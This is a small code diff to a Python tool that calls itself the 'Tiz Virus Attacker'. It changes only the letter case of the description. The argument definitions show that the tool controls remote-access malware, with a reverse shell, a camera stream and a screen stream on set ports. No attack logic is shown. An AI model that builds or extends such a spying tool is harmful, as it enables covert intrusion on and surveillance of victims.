@@ -4,7 +4,7 @@ import socket, argparse, sys, threading
 
 #arguments parser
 def parseargs():
-    cli_args = argparse.ArgumentParser(description="Tiz Virus attacker")
+    cli_args = argparse.ArgumentParser(description="Tiz Virus Attacker")
     cli_args.add_argument('--host',help="connecting ip, default is localhost'", default='127.0.0.1', type=str)
     cli_args.add_argument('--port',help="default port is 5000, revershell = port, camera stream = port+1, screen stream = port+2", default=5000, type=int)
     cli_args.add_argument('--shell',help="shell=t revershell on port (default = 5000) / shell=f don't revershell", default="t", type=str)
